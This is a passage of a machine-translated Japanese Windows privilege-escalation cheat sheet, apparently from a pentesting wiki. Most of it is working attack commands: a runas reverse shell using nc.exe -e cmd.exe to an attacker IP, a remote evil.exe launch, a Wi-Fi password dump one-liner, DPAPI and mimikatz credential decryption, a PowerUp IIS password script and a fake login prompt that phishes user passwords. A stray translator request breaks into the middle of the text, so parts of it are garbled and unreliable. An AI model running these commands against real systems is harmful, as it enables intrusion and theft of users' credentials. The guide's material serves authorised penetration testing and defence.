DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの対策
- DACLで制限することを意図したデバイスオブジェクトを作成する際は、常に FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作に対して呼び出し元のコンテキストを検証する。プロセスの終了やハンドルの返却を許可する前に PP/PPL チェックを追加する。
- IOCTLs（access masks、METHOD_*、入力検証）を制限し、直接的な kernel 権限ではなく brokered models を検討する。

防御者向けの検出案
- 疑わしいデバイス名（e.g., \\ .\\amsdk*）へのユーザーモードからのオープンや、濫用を示す特定の IOCTL シーケンスを監視する。
- Microsoft の vulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、独自の allow/deny リストを維持する。


## PATH DLL Hijacking

もし **write permissions inside a folder present on PATH** を持っている場合、プロセスによってロードされる DLL をハイジャックして **escalate privileges** できる可能性があります。

PATH 内のすべてのフォルダの権限を確認する:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については、次を参照してください：

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされた他の既知のコンピュータがないか確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェース & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 開いているポート

外部から**制限されたサービス**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP テーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**このページで Firewall 関連のコマンドを確認してください**](../basic-cmd-for-pentesters.md#firewall) **(ルールの一覧、ルールの作成、無効化、無効化...)**

さらに [network enumeration のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも見つかります。

root ユーザー権限を取得すると任意のポートでリッスンできます（最初に `nc.exe` を使ってポートをリッスンする際、GUI で `nc` をファイアウォールで許可するか尋ねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bashをrootで簡単に起動するには、`--default-user root` を試してください。

フォルダ `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 内の `WSL` ファイルシステムを参照できます。

## Windows の資格情報

### Winlogon の資格情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 資格情報マネージャ / Windows Vault

出典 [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Windows Vault は、Windows がユーザーを自動的にログオンさせることができるサーバー、ウェブサイト、その他のプログラム用のユーザ資格情報を保存します。最初は、ユーザーが Facebook、Twitter、Gmail などの認証情報を保存してブラウザから自動ログインするためのもののように見えるかもしれません。しかし、そうではありません。

Windows Vault は、Windows が自動的にユーザーをログインさせるための資格情報を保存します。つまり、リソース（サーバーやウェブサイト）にアクセスするのに資格情報を必要とする任意の Windows アプリケーションは、この Credential Manager と Windows Vault を利用して、ユーザーが毎回ユーザー名とパスワードを入力する代わりに保存された資格情報を使用できる、ということです。

アプリケーションが Credential Manager とやり取りしない限り、特定のリソース用の資格情報を使用することはできないと思われます。したがって、アプリケーションが vault を利用したい場合は、何らかの方法で Credential Manager と通信し、デフォルトのストレージ vault からそのリソース用の資格情報を要求する必要があります。

マシンに保存されている資格情報を一覧表示するには `cmdkey` を使用します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された資格情報を使用するために、`/savecred` オプション付きで `runas` を使用できます。 以下の例は、SMB 共有経由でリモートバイナリを呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された資格情報を使って `runas` を使用する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**データ保護API (DPAPI)** は、主に Windows オペレーティングシステム内で、非対称秘密鍵を対称的に暗号化するために使用されるデータの対称暗号化手段を提供します。 この暗号化は、エントロピーに大きく寄与するユーザーまたはシステムのシークレットを利用します。

**DPAPIは、ユーザーのログインシークレットから導出された対称鍵を通じてキーの暗号化を可能にします**。 システム暗号化の場合は、システムのドメイン認証シークレットを利用します。

DPAPIを使用して暗号化されたユーザーのRSAキーは、%APPDATA%\Microsoft\Protect\{SID} ディレクトリに格納されます。ここで {SID} はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。 **DPAPIキーは、ユーザーの秘密鍵を保護するマスターキーと同じファイルに共存しており、** 通常64バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されており、CMDの `dir` コマンドでは内容を一覧表示できませんが、PowerShellでは一覧表示できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** `dpapi::masterkey` を使用すると、それを復号できます。

**マスターパスワードで保護された資格情報ファイル**は通常次の場所にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
適切な `/masterkey` を指定して **mimikatz module** `dpapi::cred` を使用すると復号できます。\
`sekurlsa::dpapi` モジュールを使えば（root の場合）、**extract many DPAPI** **masterkeys** from **memory**。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 資格情報

**PowerShell credentials** は、暗号化された資格情報を便利に保存する方法として、**scripting** や自動化タスクでよく使用されます。これらの資格情報は **DPAPI** によって保護されており、通常は作成されたのと同じコンピュータ上の同じユーザーでしか復号できません。

それを含むファイルから PS の資格情報を**復号**するには、次のようにします:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### 無線LAN
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

次のレジストリキーにあります：`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\ 
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモートデスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Mimikatz の `sekurlsa::dpapi` モジュールを使って、メモリから多くの DPAPI masterkeys を抽出できます。

### Sticky Notes

Windows ワークステーションでは、StickyNotes アプリを使ってデータベースファイルであることに気付かずに **save passwords** やその他の情報を保存していることがよくあります。  
このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、見つけて調査する価値があります。

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、いくつかの **credentials** が設定されており、**recovered** できる可能性があります。

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認してください .\
Installers は **run with SYSTEM privileges**, 多くは **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).** に脆弱です。
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内の SSH 鍵

SSH の秘密鍵はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されていることがあるため、そこに興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかった場合、それはおそらく保存された SSH key です。これは暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使用して簡単に復号できます。\
この手法についての詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

もし `ssh-agent` サービスが動作しておらず、起動時に自動的に開始させたい場合は次を実行してください:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この手法はもう有効ではないようです。いくつかのssh鍵を作成し、`ssh-add`で追加してsshでマシンにログインしてみました。レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon は非対称鍵認証中に `dpapi.dll` の使用を検出しませんでした。

### 無人ファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
これらのファイルは**metasploit**を使用して検索することもできます: _post/windows/gather/enum_unattend_

例の内容:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM のバックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

ファイル **SiteList.xml** を検索してください

### Cached GPP パスワード

以前、Group Policy Preferences (GPP) を使って複数のマシンにカスタムのローカル管理者アカウントを展開する機能が存在しました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOL に XML ファイルとして保存される Group Policy Objects (GPOs) は任意のドメインユーザがアクセス可能でした。次に、これらの GPP 内のパスワードは公開されているデフォルトキーで AES256 によって暗号化されており、認証された任意のユーザが復号できました。これにより、ユーザが権限を昇格させる可能性があるなど深刻なリスクが生じていました。

このリスクを軽減するため、ローカルにキャッシュされた GPP ファイルのうち "cpassword" フィールドが空でないものをスキャンする関数が作成されました。該当ファイルが見つかると、その関数はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。このオブジェクトには GPP の詳細とファイルの場所が含まれており、このセキュリティ脆弱性の特定と修復に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (Windows Vista以前)_ を検索して、以下のファイルを探してください:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexecを使用してpasswordsを取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web構成
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
認証情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN の認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials を要求する

ユーザーがそれらを知っている可能性があると思えば、いつでも**ユーザーに自身のcredentials、あるいは別のユーザーのcredentialsを入力するよう頼む**ことができます（注意：クライアントに直接**尋ねて** **credentials**を要求するのは本当に**危険**です）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials を含む可能性のあるファイル名**

以前、**passwords** が **clear-text** または **Base64** で含まれていたと知られているファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
指定されたファイル (src/windows-hardening/windows-local-privilege-escalation/README.md) の内容をここに貼ってください。内容を受け取ったら、指示どおり日本語に翻訳して同じMarkdown/HTML構文を保持します。
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### ごみ箱内の資格情報

ごみ箱も確認して、そこに資格情報が含まれていないか探してください

いくつかのプログラムに保存された**パスワードを復元する**には、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**資格情報を含むその他の可能性のあるレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザの履歴

Chrome or Firefox のパスワードが保存されている DB を確認してください。  
また、ブラウザの履歴、ブックマーク、お気に入りも確認し、そこに **パスワードが** 保存されている可能性があります。

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows オペレーティングシステムに組み込まれた技術で、異なる言語のソフトウェアコンポーネント間の **相互通信** を可能にします。各 COM コンポーネントは **class ID (CLSID) によって識別され**、各コンポーネントは一つまたは複数のインターフェースを通じて機能を公開し、それらは interface IDs (IIDs) によって識別されます。

COM クラスとインターフェースは、それぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** の下で定義されています。このレジストリは **HKEY\LOCAL\MACHINE\Software\Classes** と **HKEY\CURRENT\USER\Software\Classes** をマージして作成され、結果として **HKEY\CLASSES\ROOT** になります。

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

基本的に、実行される **DLLs のいずれかを上書きできる** と、もしその DLL が別のユーザーによって実行される場合に **escalate privileges** できます。

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリでの一般的なパスワード検索**

**ファイル内容の検索**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### passwords を検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **は msf** プラグインです。私がこのプラグインを作成したのは、被害者内で credentials を検索するすべての metasploit POST module を**自動的に実行する**ためです。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) はこのページで言及された passwords を含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) はシステムから password を抽出するもう一つの優れたツールです。

ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、clear text でこのデータを保存するいくつかのツールの **sessions**, **usernames** および **passwords** を検索します (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **SYSTEMとして実行されているプロセスが新しいプロセスを開く** (`OpenProcess()`) with **full access**. The same process **別の新しいプロセスも作成する** (`CreateProcess()`) **低権限だがメインプロセスの全てのオープンハンドルを継承している**.\
Then, if you have **低権限プロセスに対してfull accessがある場合**, you can grab the **`OpenProcess()`で作成された特権プロセスへのオープンハンドルを取得し** and **inject a shellcode**.\
[この脆弱性を**検出して悪用する方法**の詳細についてはこの例を参照してください。](leaked-handle-exploitation.md)\
[より完全な説明（異なる権限レベルで継承されたプロセスやスレッドのopen handlersをテストして悪用する方法を含む）についてはこの投稿を参照してください。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## Named Pipe Client Impersonation

共有メモリセグメント、**pipes**と呼ばれるものは、プロセス間の通信とデータ転送を可能にします。

Windowsは**Named Pipes**という機能を提供しており、関連のないプロセス間でも、ネットワークを越えてデータを共有できます。これはクライアント/サーバの構成に似ており、役割は**named pipe server**と**named pipe client**として定義されます。

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. パイプ経由で通信する**privileged process**を特定してそれを模倣できれば、そのプロセスがあなたの作成したパイプとやり取りした際にそのアイデンティティを取得して**gain higher privileges**する機会が生まれます。この攻撃の実行手順については、次のガイドを参照してください：[**here**](named-pipe-client-impersonation.md) と [**here**](#from-high-integrity-to-system)。

また、次のツールを使うとburpのようなツールでnamed pipe通信を**インターセプト**できます： [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **および、こちらのツールはすべてのパイプを列挙・表示してprivescsを探すのに使えます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). 認証済みのリモートクライアントは、mailslotベースの非同期イベント経路を悪用して `ClientAttach` を任意の既存ファイルに対する**4-byte write**に変換できます（そのファイルは`NETWORK SERVICE`で書き込み可能であること）。その後、Telephonyの管理権限を取得し、任意のDLLをサービスとしてロードさせることが可能です。フルフロー:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → サービスはそれを `CreateFileW(..., OPEN_EXISTING)` で開き、async event の書き込み先として使用します。
- 各イベントは `Initialize` の attacker-controlled な `InitContext` をそのハンドルに書き込みます。`LRegisterRequestRecipient` (`Req_Func 61`) で line app を登録し、`TRequestMakeCall` (`Req_Func 121`) をトリガーし、`GetAsyncEvents` (`Req_Func 0`) で取得し、登録解除/シャットダウンして決定論的な書き込みを繰り返します。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分を追加し、再接続後、任意のDLLパスで `GetUIDllName` を呼び出すことで、`TSPI_providerUIIdentify` を `NETWORK SERVICE` として実行させます。

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

